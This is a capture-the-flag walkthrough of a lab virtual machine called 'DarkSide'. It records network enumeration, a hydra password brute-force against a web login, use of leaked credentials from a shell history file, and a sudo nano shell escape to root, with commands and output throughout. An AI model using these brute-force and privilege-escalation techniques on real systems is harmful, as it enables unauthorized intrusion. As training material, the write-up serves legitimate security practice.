@@ -1,0 +1,310 @@
+			ENUMERATION
+		
+	
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 69010  bytes 6384945 (6.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 69720  bytes 4347915 (4.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 5409  bytes 1439500 (1.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5409  bytes 1439500 (1.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+              
+
+
+---netdiscover---
+
+                                                                       
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                   
+                                                                                                                   
+ 24 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1440                                                 
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      6     360  Unknown vendor                                                  
+ 10.0.2.2        52:54:00:12:35:00      6     360  Unknown vendor                                                  
+ 10.0.2.3        08:00:27:ad:a3:a8      6     360  PCS Systemtechnik GmbH                                          
+ 10.0.2.45       08:00:27:66:3f:1f      6     360  PCS Systemtechnik GmbH                                          
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                             
+
+
+
+---nmap on target---
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.45 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 13:11 +03
+Nmap scan report for 10.0.2.45
+Host is up (0.00080s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)
+|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)
+|_  256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-server-header: Apache/2.4.56 (Debian)
+|_http-title: The DarkSide
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+MAC Address: 08:00:27:66:3F:1F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.80 ms 10.0.2.45
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds
+                       
+
+
+---we see open ssh and http ports, lets do some enum---
+
+
+
+---I saw PHPSESSID in our nmap scan, I start searching it but no use comes from it---
+
+
+
+---I check the website and it has a login page---
+
+
+---I run dirb, gobuster and ctfenum scans and the results are all the same---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.45
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Apr 29 13:32:28 2024
+URL_BASE: http://10.0.2.45/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.45/ ----
+==> DIRECTORY: http://10.0.2.45/backup/                                                                            
++ http://10.0.2.45/index.php (CODE:200|SIZE:683)                                                                   
++ http://10.0.2.45/server-status (CODE:403|SIZE:274)                                                               
+                                                                                                                   
+---- Entering directory: http://10.0.2.45/backup/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Apr 29 13:32:36 2024
+DOWNLOADED: 4612 - FOUND: 2
+                        
+
+
+---I see a page called backup and in it there is a txt file that has some usernames, I will save them in a file---
+
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/DARKSIDE LINUX CTF]
+└─# cat users.txt                              
+rijaba
+xerosec
+sml
+cromiphi
+gatogamer
+chema
+talleyrand
+d3b0o
+kevin
+
+
+---kevin is the user that will be accepted or not into the darkside, so I decide to use his username and 
+try to brute-force our way into the login page using it---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# hydra -l kevin -P wordlists/rockyou.txt 10.0.2.45 http-post-form "/:user=kevin&pass=^PASS^:invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-29 14:22:39
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.0.2.45:80/:user=kevin&pass=^PASS^:invalid
+[80][http-post-form] host: 10.0.2.45   login: kevin   password: iloveyou
+1 of 1 target successfully completed, 1 valid password found
+
+
+---we got username=kevin and password=iloveyou---
+
+
+---after I login with this user credentials I got a string which looks encoded, 
+it is kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC---
+
+ 
+
+
+---I checked multiple websites and couldn't find much, I decide to go to cyberchef.com and try the methods there---
+
+
+---There I use the magic recipe and put our encoded text there, 
+when we decode it we get a path which is sfqekmgncutjhbypvxda.onion---
+
+
+---go to http://10.0.2.45/sfqekmgncutjhbypvxda.onion/ and we get a text saying "Which side are you on"---
+
+
+---I inspect the website and find a path there, hwvhysntovtanj.password---
+
+
+---Go to the http://10.0.2.45/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password adress and we find credentials---
+
+
+username = kevin   password = ILoveCalisthenics
+
+
+
+---lets get into ssh---
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh kevin@10.0.2.45
+kevin@10.0.2.45's password: 
+Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
+kevin@darkside:~$ ls
+user.txt
+kevin@darkside:~$ cat user.txt
+
+---First User Flag---
+
+
+
+---now lets search for priv escalate---			
+			
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+kevin@darkside:~$ ls -la
+total 36
+drwxr-xr-x 4 kevin kevin 4096 Apr 29 13:54 .
+drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
+lrwxrwxrwx 1 kevin kevin    9 Oct 30 08:41 .bash_history -> /dev/null
+-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
+-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
+drwx------ 3 kevin kevin 4096 Apr 29 13:54 .gnupg
+-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
+drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
+-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
+-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
+
+
+
+---I check all the hidden files and find something interesting in .history---
+
+
+
+kevin@darkside:~$ cat .history 
+ls -al
+hostname -I
+echo "Congratulations on the OSCP Xerosec"
+top
+ps -faux
+su rijaba
+ILoveJabita
+ls /home/rijaba
+
+
+---password of rijaba is probably ILoveJabita, lets try---
+
+
+
+kevin@darkside:~$ su rijaba
+Password: 
+
+rijaba@darkside:/home/kevin$ whoami
+rijaba
+
+
+---we have performed horizontal priv escalate, now lets find if rijaba has any permissions to run files as root---
+
+
+rijaba@darkside:/home/kevin$ sudo -l
+Matching Defaults entries for rijaba on darkside:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rijaba may run the following commands on darkside:
+    (root) NOPASSWD: /usr/bin/nano
+
+
+
+---now we learn that we can use nano to priv escalate, lets check gtfobins---
+
+
+---https://gtfobins.github.io/gtfobins/nano/#sudo sudo for nano will be what we are going to use for the priv 
+escalate---
+
+
+rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
+
+
+---then we use Ctrl+R and Ctrl+X , after that we write "reset; sh 1>&0 2>&0" in the reset section, finally when
+it is executing just type reset and boom, you are root now---
+
+
+# whoami
+root
+# cd /root
+# ls
+root.txt  vboxpostinstall.sh
+# cat root.txt
+
+---Root User Flag---
+
+
